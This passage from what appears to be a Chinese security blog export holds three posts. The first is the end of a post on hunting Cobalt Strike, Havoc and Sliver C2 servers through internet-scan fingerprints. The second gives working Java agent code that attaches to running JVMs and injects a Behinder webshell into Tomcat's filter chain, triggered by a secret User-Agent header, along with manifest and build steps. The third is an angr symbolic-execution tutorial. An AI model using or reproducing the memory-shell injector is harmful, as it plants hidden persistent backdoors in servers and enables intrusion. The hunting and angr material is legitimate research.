50050上的客户端连接\n我们通过port:50050进行搜索：\n\n75w条的数据基数过于庞大，这时候的数据我们是不可以拿来投入生产的，需要进行更多的过滤，其中的一个方法就是对banner的hash做限制，CS默认的hash（2007783223）可以在这里作为过滤条件\n所以我们的条件变更为port:50050 hash:-2007783223\n\n加上hash的限制之后直接锐减到19条，我焯\n19条的数据人工去判断的成本也是完全可以接受的，quake目前好像不支持hash的搜索，这里就不展示了\n默认SSH客户端Hash依托于项目[hassh](salesforce/hassh: HASSH is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of a small MD5 fingerprint. (github.com)),我们可以计算SSH客户端的信息，然后通过搜索这些hash相关的IP来捕获一些恶意IP，这里使用greynoise进行搜索，这个东西感觉和微步在线X情报社区搜IP的时候的那个IP画像功能差不多，有对IP打的tag。\nhassh(CobaltStrike_SSH-client) = a7a87fbe86774c2e40cc4a7ea2ab1b3c\nrelated to: SSH-2.0-libssh2_1.8.0 || SSH-2.0-libssh2_1.7.0\n\n[搜索](Query Results | GreyNoise Visualizer)\n\n可以看到结果中已经有被标记为恶意的CS SSH CLIENT的数据了，但是和之前不同，TOP榜里的地区居然不是中国第一名了。。。。\n\nJA3的指纹们JA3JA3是一个开源项目，可以为客户端和服务器之间的通信创建SSL指纹。这些独特的签名可以代表客户端Hello数据包中的多个字段值。\n与CS相关的已知JA3签名包括以下内容。例如，CS的Beacon使用Windows套接字来启动TLS通信,但是这种方法并不特定于Cobalt Strike。\nJA3S在创建了JA3之后，为TLS握手服务器端指纹创建了一种新的方法，即TLS服务器Hello消息。JA3S方法是收集以下字段在服务器Hello数据包中的字节的十进制值：版本、可接受的加密方式和扩展列表。\n可以从已知的C2列表中提取所有的JA3S以对它们进行聚类，并基于其他相似之处扩大搜索范围。但是这超出了本文的范围，存在太多的误报风险。\n这里结合product字段贴出出现频率比较高的指纹\n\nJARM与JA3/JA3S类似，JARM能够对远程服务器的TLS数值进行指纹识别。它通过与目标服务器进行交互发送10个TLS客户端Hello数据包，并记录回复中的特定属性。然后，它将哈希结果值并创建最终的JARM指纹。\n但是如果使用JARM扫描Cobalt Strike服务器，获得的结果取决于服务器所使用的Java版本。CS的文档中建议使用时首选OpenJDK 11。这使得容易识别潜在的Cobalt Strike服务器，但是也容易产生误报。（Java的东西在互联网上真是太多了）\n默认配置的Cobalt Strike对应的JARM指纹是07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2\n搜索如下：\n\n其他与Cobalt Strike服务器有关的JARM如下，更多JARM指纹可以参考[JARM](active_c2_ioc_public/jarm_cs_202107_uniq_sorted.txt at main · carbonblack/active_c2_ioc_public (github.com))：\n\n这种方法容易出现许多误报，并且只能帮助你了解一个IP是否可能与CS有关，工作中不要将其作为主要方法。\n拓展网站的HTML HashShodan的爬虫可以计算网站的Hash。要找到相同的网站，可以使用http.html_hash，它是网站HTML的Hash。也可以使用这个[工具](ninoseki/apullo: A scanner for taking basic fingerprints (github.com))生成哈希值。\n根据CS服务器的配置方式，哈希值可能基于默认设置为null。如果攻击者修改了默认配置，那么就会生成Hash。可以在html_hash上进行判断，以找出具有相同哈希值的其服务器。\n例如我们首先使用product字段查看已经明确的CS服务器的html hash：\n\n可以看到有一条hash为2101032290的数据，然后我们去除product标签直接进行搜索：\nhttp.html_hash:\"2101032290\"\n\n可以看到结果有17条，后续就可以将刚才三条过滤掉对剩下的14条进行分析和确认。\n同样的，这个思路还可以被用在HTTP Header hash\n\n例如这个316618825，按照上面所说的思路进行拓展之后：\nhttp.headers_hash:\"316618825\"\n\n读懂C2这条方法主要是针对一些开源的C2框架或者能够搞到源码的C2，例如HavocFramework\n通过观察HavocFramework的代码，可以看到[代码](Havoc/https.go at 1248ff9ecc964325447128ae3ea819f1ad10b790 · HavocFramework/Havoc (github.com))中存在定义：\norgNames = []string{\n    \"\",\n    \"ACME\",\n    \"Partners\",\n    \"Tech\",\n    \"Cloud\",\n    \"Synergy\",\n    \"Test\",\n    \"Debug\",\n}\norgSuffixes = []string{\n    \"\",\n    \"co\",\n    \"llc\",\n    \"inc\",\n    \"corp\",\n    \"ltd\",\n}\n\n这其中就包含了生成的证书：ACME、Partners、Tech、Cloud、Synergy、Test、Debug\n我们使用其中的一个特征来进行搜索\n\n同时，sliver也使用了这几种随机的org，[代码](sliver/subject.go at 97d3da75b6e24defb3a2a97443a15a632b3a8448 · BishopFox/sliver (github.com))\n通过列表中的属性能够方便我们快速确定一台C2服务器\n其他的“歪门邪道”Quake支持对相应包的搜索，所以我们可以寻找到一些在互联网上开放了目录的服务器，查看其中的内容\n打开目录页面标题主要由正在使用的 Web 服务器决定。如果它是一个 Apache2 服务器，标题将是“Index of /”，如果它是一个 Python HTTP 服务器，内容将会是目录列表\n\n\n攻击者通常倾向于使用Python搭建临时HTTP文件服务器，但是有时他们会忘记及时关闭Python HTTP服务器，导致我们可以通过HTTP响应进行过滤。例如我们可以输入任何安全工具或恶意软件的名称来进行过滤：\ntitle: \"Directory listing for /\" and response:\"cobaltstrike\"\n\n看到目前或曾经有68个服务器托管了Cobalt Strike供攻击者下载\ntitle: \"Directory listing for /\" and response:\"mimikatz\"\n\ntitle: \"Directory listing for /\" and response:\"exp\"\n\n碰巧逮到个没关的\n\n虽然妹有C2，但也是个用于托管恶意代码的服务器，可以将样本下载进行分析\n结语由于作者比较菜，所以这里给出的方式还是比较少的，后续等弟弟精进一下分享些高级的Hunting手法\n其中分享的手法有的只能用来进行辅助判断，在实际的生产时需要考虑误报的情况，毕竟情报误报还是比\n较严重的。\n其中还有一些手法例如通过地区、托管的服务商、Nmap扫描等大家感兴趣可以拓展一下。\n（希望各位大师傅不吝赐教，轻喷\nReference\nGustav Shen – Medium\nMichael Koczwara (@MichalKoczwara) / Twitter\n\n","slug":"Hunting C2","date":"2023-04-06T10:38:45.000Z","categories_index":"Hunting","tags_index":"Hunting","author_index":"RainSec"},{"id":"0a365c2eded74277e35f4b4f4e3376ba","title":"初识Java agent类型内存马","content":"初识Java agent类型内存马前言你是否遇到过这样的场景，springboot环境下各种反序列化的点，但是可用的反序列化链不能直接加载类打入内存马，只能执行系统命令，甚至目标环境不出网，或者已经反弹shell或cs上线成功了，但是想要注入一个webshell。这时候就需要用到agent类型内存马了。\n前置知识点JavaAgent 是JDK 1.5 以后引入的，可以在Java程序运行之前或运行期间修改类的字节码，Java agent可以是一个编译好的jar文件，使用方式有两种：-实现premain方法，在JVM启动前加载。-实现agentmain方法，在JVM启动后加载。(jdk 1.6 之后提供)实现了premain方法的agent 就可以在启动Java程序时使用 -javaagent 参数来加载。实现了agentmain方法的agent可以通过进程pid来连接到启动后的Java程序上。agentmain方法声明如下，拥有Instrumentation inst参数的方法优先级更高：\npublic static void premain(String agentArgs, Instrumentation inst) {\n    ...\n}\n\npublic static void premain(String agentArgs) {\n    ...\n}\n第一个参数String agentArgs就是Java agent的参数。第二个参数Instrumentaion inst比较重要，有三个需要用到的方法：\n\ngetAllLoadedClasses:获取目标已经加载的类。\naddTransformer:增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。\nretransformClasses: 在类加载之后，重新定义 Class。\n\nAgent实现主要依靠VirtualMachine和VirtualMachineDescriptor这两个类\nVirtualMachine\nVirtualMachine可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。\n\nAttach：允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上\nloadAgent：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。\nDetach：解除Attach\nVirtualMachineDescriptor\n​ VirtualMachineDescriptor是用于描述 Java 虚拟机的容器类。它封装了一个标识目标虚拟机的标识符，以及一个AttachProvider在尝试连接到虚拟机时应该使用的引用。标识符依赖于实现，但通常是进程标识符（或 pid）环境，其中每个 Java 虚拟机在其自己的操作系统进程中运行。\n\n​ VirtualMachineDescriptor实例通常是通过调用VirtualMachine.list() 方法创建的。这将返回描述所有已安装 Java 虚拟机的完整描述符列表attach providers。\njar包中的MANIFEST.MF 文件必须指定 Agentmain-Class 项，Agentmain-Class 指定的那个类必须实现 agentmain() 方法\n编写一个agent.jar笔者在github找了好久，基本是一些本地调试用的demo，没找到能直接能用的且较为通用的。所以就在 ethushiroha师傅 项目 JavaAgentTools BehindShell 的基础上进行修改。\n\npackage org.apache.spring;\n\n\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.lang.instrument.Instrumentation;\nimport java.lang.instrument.UnmodifiableClassException;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class m {\n    public static final String TransformedClassName = c.SpringMemShellConfig.TransformedClassName;\n    public static Instrumentation i = null;\n\n    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, IOException {\n        //启动方法\n        i = inst;\n        System.out.println(\"Agent load ...\");\n        start();\n    }\n\n    public static String start() throws UnmodifiableClassException {\n        System.out.println(\"Agent start ...\");\n        //t继承了ClassFileTransformer接口，重写了transform方法，用于拦截修改加载的类字节码，此方法返回值是通过javassist修改好的字节码，\n        final t t1 = new t();\n        //获取目标所有已经加载的类\n        Class[] classes = i.getAllLoadedClasses();\n        for (Class aClass : classes) {\n            if (aClass.getName().equals(TransformedClassName)) {\n                //这里修改的是org.apache.catalina.core.ApplicationFilterChain类的doFilter方法，测试的时候有一个坑点是测试jar包启动时需要访问一下Web，ApplicationFilterChain类才会加载，上面获取所有类的时候才可以获取到ApplicationFilterChain类。\n                System.out.println(\"Agent get TransformedClassName ...\");\n                //添加拦截器\n                i.addTransformer(t1, true);\n                //重新定义ApplicationFilterChain类，触发拦截器也就是t类的transform方法\n                i.retransformClasses(aClass);\n                return \"Success\";\n            }\n        }\n        return \"ERROR::\";\n    }\n    public static void main(String[] args)\n            throws RuntimeException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n                //agent.jar 用到的核心类VirtualMachine和VirtualMachineDescriptor在jdk的tools.jar里，如果直接把tools.jar一块打进agent.jar里，不能跨平台使用，笔者测试mac编译无法在linux中使用\n                //通过URLClassLoader加载目标环境的tools.jar，可以变得更加通用\n                String toolsJarPath = System.getProperty(\"java.home\") + File.separator + \"..\" + File.separator + \"lib\" + File.separator + \"tools.jar\";\n                URLClassLoader classLoader = null;\n                try {\n                    classLoader = new URLClassLoader(new URL[]{new File(toolsJarPath).toURI().toURL()});\n                } catch (MalformedURLException e) {\n                    System.err.println(\"tools.jar load error\");\n                    System.exit(-1);\n                }\n\n                Class&lt;?&gt; vmClass = null;\n                Class&lt;?&gt; vmdClass = null;\n                try {\n                    vmClass = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachine\");\n                    vmdClass = classLoader.loadClass(\"com.sun.tools.attach.VirtualMachineDescriptor\");\n                } catch (ClassNotFoundException e) {\n                    e.printStackTrace();\n                }\n                Object vmObj = null;\n                String agentpath = null;\n                List&lt;String&gt; list = new ArrayList&lt;String&gt;();\n                if (args.length == 2) {\n                    list.add(args[0]);\n                    agentpath = args[1];\n                } else if (args.length==1) {\n                    list.add(args[0]);\n                    //获取agent.jar的绝对路径\n                    agentpath = m.class.getProtectionDomain().getCodeSource().getLocation().getFile();\n                } else if (args.length==0) {\n                    //通过VirtualMachineDescriptor类的list方法 获取目标环境中运行的Java进程，省去查找pid这一步\n                    Method listMethod = vmClass.getDeclaredMethod(\"list\", new Class[]{});\n                    List&lt;Object&gt; vmlist = (List&lt;Object&gt;) listMethod.invoke(null);\n                    Method idMethod = vmdClass.getDeclaredMethod(\"id\",new Class[]{});\n                    Method displayNameMethod= vmdClass.getDeclaredMethod(\"displayName\",new Class[]{});\n                    for (Object vmd : vmlist) {\n                        System.out.println(String.format(\"get vmname: %s  pid: %s\",(String) displayNameMethod.invoke(vmd),(String) idMethod.invoke(vmd)));\n                        list.add((String) idMethod.invoke(vmd));\n                    }\n                    agentpath = m.class.getProtectionDomain().getCodeSource().getLocation().getFile();\n                }else {\n                    System.err.println(\"usage : java -jar agent.jar\\r\\njava -jar agent.jar pid\\r\\njava -jar agent.jar pid agentpath\");\n                    System.err.println(\"Parameter error\");\n                    System.exit(-1);\n                }\n\n                System.out.println(\" agentpath :\" + agentpath);\n                for (String pid :list){\n                    try {\n                        System.out.println(String.format(\"try attach %s\",pid));\n                        Method attachMethod = null;\n                        try {\n                            //连接到此Java进程\n                            attachMethod = vmClass.getDeclaredMethod(\"attach\", String.class);\n                        } catch (NoSuchMethodException e) {\n                            e.printStackTrace();\n                        }\n                        vmObj = (Object) attachMethod.invoke(null, pid);\n                        if (vmObj != null) {\n                            //加载agent.jar 触发agentmain方法\n                            Method loadAgentMethod2 = vmClass.getDeclaredMethod(\"loadAgent\", String.class);\n                            loadAgentMethod2.invoke(vmObj, agentpath);\n\n                        }\n                    } catch (InvocationTargetException e) {\n                        e.printStackTrace();\n                    } catch (NoSuchMethodException e) {\n                        e.printStackTrace();\n                    } catch (IllegalAccessException e) {\n                        e.printStackTrace();\n                    } finally {\n                        if (null != vmObj) {\n                            Method detachMethod = null;\n                            try {\n                                //断开连接\n                                detachMethod = vmClass.getDeclaredMethod(\"detach\", new Class[]{});\n                            } catch (NoSuchMethodException e) {\n                                e.printStackTrace();\n                            }\n                            try {\n                                detachMethod.invoke(vmObj);\n                            } catch (IllegalAccessException e) {\n                                e.printStackTrace();\n                            } catch (InvocationTargetException e) {\n                                e.printStackTrace();\n                            }\n                        }\n\n\n                    }\n                }\n            }\n}\nt.transform 读取jar包里的start.txt，把读取到的内容插入到ApplicationFilterChain类的doFilter方法里，默认所有路由都有效，可以添加User-Agent来判断是否走到webshell，org.apache.spring.b.d就是一个冰蝎马\n{\n\n    javax.servlet.http.HttpServletRequest request = $1;\n    javax.servlet.http.HttpServletResponse response = $2;\n\n    try {\n        Object session = request.getSession();\n\n        if (request.getHeader(\"User-Agent\").equals(\"RainSec\")) {\n            org.apache.spring.b.d(request, response, session);\n            return ;\n        }\n    } catch (Exception e) {\n\n    }\n\n}\n\n创建 /src/main/resources/META-INF/MANIFEST.MF 文件，内容如下\nManifest-Version: 1.0\nAgent-Class: org.apache.spring.m\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\nCan-Set-Native-Method-Prefix: true\nMain-Class: org.apache.spring.m\n\n\npom.xml 中加入此配置把自定义的MANIFEST.MF打到jar包中\n&lt;plugin&gt;\n\t\t\t\t&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;\n\t\t\t\t&lt;version&gt;3.2.0&lt;/version&gt;\n\t\t\t\t&lt;configuration&gt;\n\t\t\t\t\t&lt;archive&gt;\n                        &lt;manifestEntries&gt;&lt;/manifestEntries&gt;\n                        &lt;manifestFile&gt;src/main/resources/META-INF/MANIFEST.MF&lt;/manifestFile&gt;\n                    &lt;/archive&gt;\n\t\t\t\t&lt;/configuration&gt;\n\t\t\t&lt;/plugin&gt;\n\nmvn clean package -DskipTests 编译 。\n几个坑点最后记录一下整个编写测试中遇到的坑点。\n\n刚开始直接找了几个项目编译测试均失败，后发现是tools.jar 的问题，最后用URLClassLoader加载目标环境下tools.jar 解决。\n测试springboot jar包启动后需访问一下web才会加载ApplicationFilterChain类，后续才能获取到再修改。\n本项目注入的内存马非常容易修改，测试了一下注入蚁剑webshell，因为蚁剑连接webshell不是用的反射会连接失败。\n刚开始想改的是threedr3am师傅的ZhouYu项目，发现直接持久化直接替换jar包会导致服务异常，重启替换后的jar之后shell可正常使用，后续添加持久化功能可以在注入进程退出时再执行替换jar包。笔者找到的一些agent内存马项目https://github.com/ethushiroha/JavaAgentToolshttps://github.com/threedr3am/ZhouYuhttps://github.com/su18/MemoryShell\n\n本文内容大量引用或参考以下文章：https://mp.weixin.qq.com/s/YVwqD6SwUq_jkEe_9afBCghttps://mp.weixin.qq.com/s/gmKSmW5SIME8lWKj8bvhWwhttps://cangqingzhe.github.io/2021/10/13/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/\n","slug":"Java Agent","date":"2023-03-30T10:38:45.000Z","categories_index":"攻防研究","tags_index":"攻防研究","author_index":"RainSec"},{"id":"1ac0942cada2f27dfbac108a2c01d426","title":"Angr Taint Analysis","content":"Angr Taint Analysis\n\n\n\n\n\n\n\n\n本人一直致力于二进制分析和自动化漏洞挖掘领域，这次抛砖引玉，希望可以大家多多指导\n污点分析的基本分类：\n\n动态污点分析\n静态污点分析\n\n上述分析方式都有自己的优缺点，对于动态污点分析来说，缺点如下：\n\n分析结果依赖输入。\n一些隐式调用难以跟踪。\n\n静态污点分析的缺点如下：\n\n路径爆炸问题。\n一些程序特性只有在动态执行的过程中才会展示出来。\n\nangr本身的知识内容多而且杂乱，下面对一些核心的基础知识进行一下讲解。\nangr\n\n\n\n\n\n\n\n\n\nhttps://web.wpi.edu/Pubs/E-project/Available/E-project-101816-114710/unrestricted/echeng_mqp_angr.pdf\n​        angr一般优势在于可以为逆向工程查找函数，生成函数调用图，同时其还具备一个符号执行引擎。上述研究项目为angr研究设置了三个目标：\n\n探索angr的符号执行能力并记录其复杂性。\n探索Angr作为二进制分析工具的能力。\n为angr创建一个平台，使得逆向工程师更容易接触他们。\n\n从这三个目标来看，这是一个非常适合新手学习angr的项目，展示的都是很基本的功能。\n\n\n\n\n\n\n\n\n\nhttps://archive.fosdem.org/2017/schedule/event/valgrind_angr/attachments/slides/1797/export/events/attachments/valgrind_angr/slides/1797/slides.pdf\n这个（应该）是Angr团队的一个演讲，讲的更好一点，可以理解一下Angr的底层实现。\nvex​        angr用VEX作为中间表示用来进行二进制分析，pyVEX就是一个对于VEX的python封包。其实中间语言存在于很多场合，最主要的功能是为了解决二进制分析中面临多种架构的问题，使得一次分析可以运行在多个架构之上。最主要的中间表示如下：\n\nRegister name，VEX models 存放寄存器在一个单独的内存空间里面，用offset来定位不同的寄存器。\nMem access.\nMem segmentation.\nInstruction side-effects. 很多指令具备Side-effects。比如push pop同时还会影响stack pointer, thumb mode on arm很多指令都影响flags。IR可以相应的表示这些影响。\n\nVEX主要存在以下结构，这个非常重要：\n\nExpressions. IR Expressions represent a calculated or constant value. This includes memory loads, register reads, and results of arithmetic operations.\nOperations. IR Operations describe a modification of IR Expressions. This includes integer arithmetic, floating-point arithmetic, bit operations, and so forth. An IR Operation applied to IR Expressions yields an IR Expression as a result.\nTemporary variables. VEX uses temporary variables as internal registers: IR Expressions are stored in temporary variables between use. The content of a temporary variable can be retrieved using an IR Expression. These temporaries are numbered, starting at t0. These temporaries are strongly typed (i.e., “64-bit integer” or “32-bit float”).\nStatements. IR Statements model changes in the state of the target machine, such as the effect of memory stores and register writes. IR Statements use IR Expressions for values they may need. For example, a memory store IR Statement uses an IR Expression for the target address of the write, and another IR Expression for the content.\nBlocks. An IR Block is a collection of IR Statements, representing an extended basic block (termed “IR Super Block” or “IRSB”) in the target architecture. A block can have several exits. For conditional exits from the middle of a basic block, a special Exit IR Statement is used. An IR Expression is used to represent the target of the unconditional exit at the end of the block.\n\n上面可以了解angr的一些基本概念。详细例子可以参考下面：\n\n\n\n\n\n\n\n\n\nhttps://github.com/angr/pyvex\n这些语言描述是很难的，建议还是根据官方例子调试一下，就知道每个IR对应的意思了。\n​        下图在angr团队的演讲里面展示的，正是对应的上述的VEX结构。因此可以看出pyvex可以很好的把机器码转换为中间语言来方便进行二进制分析。对于所有的vex struct都对应的有python class和enums，这些都以字符串的形式表示，总的来说就是整个的中间表示能力都可以用python完成。\n\n在Angr里面还存在SimuVEX，这是为了符号执行，它本身是作为VEX IR（IRSBs）的符号执行引擎：\n\n符号执行的一个核心在于执行环境的实现，因此SimuVEX必须实现：\n\n内存和寄存器建模。\nsyscalls\nFiles and other data sources from outside the program\nProviding symbolic summaries (SimProcedures) of common library functions\n\n这里面比较难以理解的就是symbolic summaries了，先看下angr官方的例子：\n&gt;&gt;&gt; from angr import Project, SimProcedure\n&gt;&gt;&gt; project = Project('examples/fauxware/fauxware')\n\n&gt;&gt;&gt; class BugFree(SimProcedure):\n...    def run(self, argc, argv):\n...        print('Program running with argc=%s and argv=%s' % (argc, argv))\n...        return 0\n\n# this assumes we have symbols for the binary\n&gt;&gt;&gt; project.hook_symbol('main', BugFree())\n\n# Run a quick execution!\n&gt;&gt;&gt; simgr = project.factory.simulation_manager()\n&gt;&gt;&gt; simgr.run()  # step until no more active states\nProgram running with argc=&lt;SAO &lt;BV64 0x0&gt;&gt; and argv=&lt;SAO &lt;BV64 0x7fffffffffeffa0&gt;&gt;\n&lt;SimulationManager with 1 deadended&gt;\n\n可以看出SimProcedures的一个核心作用就是hook，这里main函数不再执行，而是执行我们定义的SimProcedures，这意味着可以定义程序的运行。因此上述的4应该就是提供对于库函数的替代，这样的一个好处也在于提升了符号执行的性能。如果想对SimuVEX有一个更好的了解可以参考下面的文章，来从源代码进行理解：\n\n\n\n\n\n\n\n\n\nhttps://sites.google.com/site/bletchleypark2/malware-analysis/angr/simuvex\n如果打算做符号执行的话，还是深入读一下，这一块是对执行过程state的很核心的代码。\nclaripy\n\n\n\n\n\n\n\n\n这个玩意挺难，挺复杂的。\nhttps://docs.angr.io/advanced-topics/claripy#solvers\n​        claripy是Angr的一个约束求解引擎，主要的设计思想如下：\n\nClaripy ASTs 提供一个统一的方式和符号化的或者具体化的表达式交互。\n\n在claripy里面实现了bitvectors，这使得我们可以在变量上构建表达式符号树，对它们的值添加约束然后求解它们具体的值，这个操作依赖z3。Claripy ASTs抽象了claripy支持的不同数学结构之间的差异，实现了很多处理操作，同时还实现了求解器。求解器可以说是Claripy最主要的功能，Solvers暴露api和ASTs以不同的方式进行交互并且返回可用的值，同时其具备不同的求解器类型以满足不同的要求。通过Claripy Backends可以构建自定义求解器，但是这将非常硬核。\nsymbolic execution example​        符号执行的一个特色就是状态复制，这也是路径爆炸问题的一个根本来源，状态复制指的是在符号执行的过程中如果state A遇到一个if else分支结构，那么就会复制出来两个状态对应不同的分支。\n\n不同的state会添加不同的约束，然后最后求解的时候就是对这些约束进行求解。\nCLE\n\n\n\n\n\n\n\n\nhttps://www.anquanke.com/post/id/231591https://www.anquanke.com/post/id/231591\n（上面的好像关了。。。）\nhttps://github.com/angr/cle\n​        CLE主要表现为一个binary loader，但是其非常复杂，通过其可以将可执行文件和libraries文件载入到可用的地址空间，其复杂性来源于为不同平台，不同架构设计了统一的加载接口。这个里面最重要的其实就是VEX IR，VEX IR利用中间语言的方式抽象了机器代码的表示形式，同时消除不同体系结构之间的差异：\n\n寄存器名称。\n内存访问\n内存分段\n具有副作用的指令，比如push pop\n\nanalyses​        这是angr的核心分析模块，它将所有的抽象结合在一起形成一个统一的控制接口Project，这将实现非常便利的访问符号执行，CFG恢复，data-flow分析等等。但是这需要大量的基础知识来帮助完成理解。\n​        在对于Angr的CFG进行理解的时候也不能完全按照ida的模式去理解:\n\n\n\n\n\n\n\n\n\nhttps://docs.angr.io/introductory-errata/faq#why-is-angrs-cfg-different-from-idas\nid不会再function call的地方拆分block，但是angr会，所以angr每次的step可能会因为function call进入下一个基本块。IDA侧重于提供更好的分析体验，而angr则侧重于自动化分析，在自动化分析过程中一般不需要超图，因为自动化分析一般想要的是更细致的内容。如果一个类似jump的跳转返回到基本块中间，ida一般会拆分，但是angr不会，因为很多静态分析一般不需要，但是可以通过生成cfg的过程中传递normalize=True 参数来开启拆分功能。\nSimulation Managers\n\n\n\n\n\n\n\n\nhttps://github.com/angr/angr-doc/blob/master/docs/pathgroups.md#simulation-managers\n​        angr分析模块里面最重要的control interface就是SimulationManager了，它可以同时控制状态组的符号执行，执行不同的搜索策略来探索程序的state空间。在符号执行的过程中，States会被组织成stashes，这使得分析人员可以step forward, filter, merge, and move around as you wish，甚至同时以不同的方式指向两种不同的stash集合并对其进行合并，默认操作的的stash是active。之前已经了解到angr可能存在很多states在stash里面，这些state可以通过move切换，move存在三个参数from_stash, to_stash, and filter_func用来对states进行filter和移动。\n&gt;&gt;&gt; simgr.move(from_stash='deadended', to_stash='authenticated', filter_func=lambda s: b'Welcome' in s.posix.dumps(1))\n&gt;&gt;&gt; simgr\n&lt;SimulationManager with 2 authenticated, 1 deadended&gt;\n\n通过上述操作我们创建一个新的stash。同时必须记得，state其实就是一个list，可以通过索引访问或者迭代等其它方法访问，比如利用one_ 或者 mp_前缀，但是mp前缀返回给你的是一个 mulpyplexed version of the stash.对于stash也存在一些特殊类型，如下：\n\nactive和deadended。这两个比较容易理解，一个是当前使用的stash一个是里面包含的已经没办法继续执行的state。\npruned,  state可以通过Options进行调整，每一个state存在一个state.options，它们控制着angr 执行引擎的行为，当options中添加LAZY_SOLVES的时候，states在运行的时候不会检查满意度（satisfiability 指的是solver在求解前的测试，看看约束或者其他信息能否满足求解需要，如果返回true，接下来进行求解），除非非常必要的情况下才会进行检查，当该state unsat的时候， 遍历所有的state层级去识别历史上什么时候最初变得unsat，所有的继承于最初unsat点的state都将被放入pruned 集合。\nsave_unconstrained option如果被指定，所有被确定为无法约束的状态都会被放入这里。\nUnsat，如果save_unsat option被指定，那么所有的unsatisfiable state都被放在这个集合，大多数的原因可能是具备相互矛盾的约束。\nerrored，如果state在执行过程中遇到raise error，该state被打包进入ErrorRecord object，这其中还包括raised error，然后放入errord集合.\nYou can get at the state as it was at the beginning of the execution tick that caused the error with record.state, you can see the error that was raised with record.error, and you can launch a debug shell at the site of the error with record.debug(). This is an invaluable debugging tool!\n\n\n\nExploration Techniques\n\n\n\n\n\n\n\n\nhttps://github.com/angr/angr-doc/blob/master/docs/pathgroups.md#exploration-techniques\n​        探索技术也是angr 进行分析的核心功能，angr内建了很多探索技术，同时也允许分析人员自建探索技术。这主要用来帮助研究者自定义simulation manager的行为。在进行分析的过程中可能会遇到这种情况，对于某个state的某些部分，研究人员不想使用默认的 “step everything at once”策略，这种策略主要是利用了广度优先搜索的思想，但是有时候可能深度优先搜索更具效果，因此angr提供simgr.use_technique(tech)来让研究人员自定义探索行为。tech是一个ExplorationTechnique subclass，内建的探索技术在angr.exploration_techniques中，不过在自动化漏洞挖掘的经验中，很多情况下需要自建探索策略。这里给出一个脚本，是下面例子的一个官方解释，如果第一次接触angr，还不需要理解，只是为了提供一个demo让人更直观的体验这样的功能。\n#!/usr/bin/env python\n\nimport angr\nimport logging\n\n# This is the important logic that makes this problemt tractable\nclass CheckUniqueness(angr.ExplorationTechnique):\n    def __init__(self):\n        self.unique_states = set()\n\n    def filter(self, simgr, state, filter_func=None):\n        vals = []\n        for reg in ('eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp', 'esp', 'eip'):\n            val = state.registers.load(reg)\n            if val.symbolic:\n                vals.append('symbolic')\n            else:\n                vals.append(state.solver.eval(val))\n\n        vals = tuple(vals)\n        if vals in self.unique_states:\n            return 'not_unique'\n\n        self.unique_states.add(vals)\n        return simgr.filter(state, filter_func=filter_func)\n\n\nclass SearchForNull(angr.ExplorationTechnique):\n    def setup(self, simgr):\n        if 'found' not in simgr.stashes:\n            simgr.stashes['found'] = []\n\n    def filter(self, simgr, state, filter_func=None):\n        if state.addr == 0:\n            return 'found'\n        return simgr.filter(state, filter_func=filter_func)\n\n    def complete(self, simgr):\n        return len(simgr.found)\n\ndef setup_project():\n    project = angr.Project('/root/development/angr-doc/examples/grub/crypto.mod', auto_load_libs=False)\n\n    # use libc functions as stand-ins for grub functions\n    memset = angr.SIM_PROCEDURES['libc']['memset']\n    getchar = angr.SIM_PROCEDURES['libc']['getchar']\n    do_nothing = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained']\n\n    project.hook_symbol('grub_memset', memset())\n    project.hook_symbol('grub_getkey', getchar())\n\n    # I don't know why, but grub_xputs is apparently not the function but a pointer to it?\n    xputs_pointer_addr = project.loader.find_symbol('grub_xputs').rebased_addr\n    xputs_func_addr = project.loader.extern_object.allocate()\n    # project.hook(xputs_func_addr, do_nothing())\n    project.loader.memory.pack_word(xputs_pointer_addr, xputs_func_addr)\n\n    return project\n\ndef find_bug(project, function, args):\n    # set up the most generic state that could enter this function\n    func_addr = project.loader.find_symbol(function).rebased_addr\n    start_state = project.factory.call_state(func_addr, *args)\n    # start_state = project.factory.entry_state()\n\n    # create a new simulation manager to explore the state space of this function\n    simgr = project.factory.simulation_manager(start_state)\n    simgr.use_technique(SearchForNull())\n    simgr.use_technique(CheckUniqueness())\n    simgr.run()\n\n    print('we found a crashing input!')\n    print('crashing state:', simgr.found[0])\n    print('input:', repr(simgr.found[0].posix.dumps(0)))\n    return simgr.found[0].posix.dumps(0)\n\ndef test():\n    assert find_bug(setup_project(), 'grub_password_get', (angr.PointerWrapper(b'\\0'*64, buffer=True), 64)) == b'\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\r'\n\nif __name__ == '__main__':\n    logging.getLogger('angr.sim_manager').setLevel('DEBUG')\n    p = setup_project()\n    find_bug(p, 'grub_password_get', (angr.PointerWrapper('\\0'*64, buffer=True), 64))\n\nProgramming SimProcedures​        SimProcedures主要是用来定义程序行为，如下：\n&gt;&gt;&gt; from angr import Project, SimProcedure\n&gt;&gt;&gt; project = Project('examples/fauxware/fauxware')\n\n&gt;&gt;&gt; class BugFree(SimProcedure):\n...    def run(self, argc, argv):\n...        print('Program running with argc=%s and argv=%s' % (argc, argv))\n...        return 